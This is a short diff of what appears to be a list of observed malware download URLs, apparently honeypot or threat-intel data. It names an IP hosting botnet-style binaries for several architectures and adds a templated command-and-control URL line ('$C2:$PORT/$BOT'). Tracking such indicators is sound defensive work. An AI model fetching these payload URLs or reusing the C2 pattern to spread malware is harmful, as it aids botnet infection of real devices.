@@ -67,3 +67,4 @@
 1	http://160.119.66.206/bins/net.spc
 1	http://160.119.66.206/bins/net.x86
 1	http://160.119.66.206/bins/net.x86_64
+1	http://$C2:$PORT/$BOT
